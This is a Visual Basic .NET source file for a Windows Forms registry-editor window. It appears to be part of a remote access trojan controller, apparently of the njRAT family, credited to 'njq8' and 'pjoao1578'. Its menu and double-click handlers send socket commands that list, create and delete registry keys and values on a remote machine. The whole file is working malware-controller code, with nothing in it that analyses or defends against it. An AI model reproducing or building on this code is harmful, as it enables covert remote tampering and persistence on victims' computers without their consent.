Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.IO
Imports System
Imports System.Diagnostics
Imports Microsoft.Win32
Imports Microsoft.VisualBasic
Imports System.Windows.Forms
Imports System.Windows.Forms.Form
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas


'Coded By pjoao1578
'Coded njq8
'v3
Public Class Reg
#Region "reg"
    Public sock As Integer
    Public CN As Boolean
    Dim yy As String = "||" 'yy = senha "||"
#End Region

    Private Sub Reg_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try
            Me.RGLIST.Items.Clear() 'limpar
            Me.RGk.ResetText() 'limpar
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Reg_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.RGLIST.Items.Clear() 'limpar
            Me.RGk.ResetText() 'limpar
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Reg_Load(sender As Object, e As EventArgs) Handles MyBase.Load
       
    End Sub

    Private Sub RGk_DoubleClick(sender As Object, e As EventArgs) Handles RGk.DoubleClick
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Form1.s.Send(sock, "RG" & yy & "~" & yy & Me.RGk.SelectedNode.FullPath & "\" & yy)
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub RGLIST_DoubleClick(sender As Object, e As EventArgs) Handles RGLIST.DoubleClick
        If (Me.RGLIST.SelectedItems.Count <> 0) Then
            Dim item As ListViewItem = Me.RGLIST.SelectedItems.Item(0)
            Dim gv As New Rgv
            gv.Path = (Me.RGk.SelectedNode.FullPath & "\")
            gv.sock = sock
            gv.TextBox1.Text = item.Text
            gv.ComboBox1.SelectedIndex = gv.ComboBox1.Items.IndexOf(item.SubItems.Item(1).Text)
            Try
                gv.TextBox2.Text = item.SubItems.Item(2).Text
            Catch exception1 As Exception
                Dim exception As Exception = exception1
            End Try
            gv.Text = gv.Path
            gv.TextBox1.ReadOnly = True
            gv.ShowDialog(Me)
        End If
    End Sub

    Private Sub UpdeterToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdeterToolStripMenuItem.Click
        'updeter list
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Form1.s.Send(sock, "RG" & yy & "~" & yy & Me.RGk.SelectedNode.FullPath & "\")
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub CreatKeyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreatKeyToolStripMenuItem.Click
        'creat key
        Dim str As String = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1)
        If (str.Length <> 0) Then
            Form1.s.Send(sock, "RG" & yy & "#" & yy & Me.RGk.SelectedNode.FullPath & "\" & "||" & str)
        End If
    End Sub

    Private Sub DeleteKeyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteKeyToolStripMenuItem.Click
        'delete key
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Dim fullPath As String = Me.RGk.SelectedNode.FullPath
            If fullPath.Contains("\") Then
                Dim str2 As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)((Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1))
                Dim str3 As String = ""
                Dim num2 As Integer = (Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2)
                Dim i As Integer = 0
                Do While (i <= num2)
                    str3 = (str3 & Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) & "\")
                    i += 1
                Loop
                Form1.s.Send(sock, "RG" & yy & "$" & yy & str3 & yy & str2)
                Me.RGk.SelectedNode.Remove()
            End If
            'updeter list
            If (Not Me.RGk.SelectedNode Is Nothing) Then
                Form1.s.Send(sock, "RG" & yy & "~" & yy & Me.RGk.SelectedNode.FullPath & "\")
                Me.RGLIST.Enabled = False
                Me.RGk.Enabled = False
            End If
        End If
    End Sub

    Private Sub UpdeterToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles UpdeterToolStripMenuItem1.Click
        'updeter
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Form1.s.Send(sock, "RG" & yy & "~" & yy & Me.RGk.SelectedNode.FullPath & "\")
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click
        'edit
        Me.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(sender), e)
    End Sub

    Private Sub NovoVolueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NovoVolueToolStripMenuItem.Click
        'novo volue
        Dim gv As New Rgv
        gv.Path = Me.RGk.SelectedNode.FullPath & "\"
        gv.sock = sock
        gv.TextBox1.Text = "Name"
        gv.ComboBox1.SelectedIndex = gv.ComboBox1.Items.IndexOf("String")
        gv.TextBox2.Text = "Value"
        gv.Text = gv.Path
        gv.ShowDialog(Me)
        'updeter
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Form1.s.Send(sock, "RG" & yy & "~" & yy & Me.RGk.SelectedNode.FullPath & "\")
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        'delete
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.RGLIST.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Form1.s.Send(sock, "RG" & yy & "@5" & yy & Me.RGk.SelectedNode.FullPath & "\" & Me.yy & current.Text)
            Loop
        Finally

        End Try
        'updeter list
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Form1.s.Send(sock, "RG" & yy & "~" & yy & Me.RGk.SelectedNode.FullPath & "\")
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        Try 'exit
            Me.Close()
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ExitToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem1.Click
        Try 'exit
            Me.Close()
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub
End Class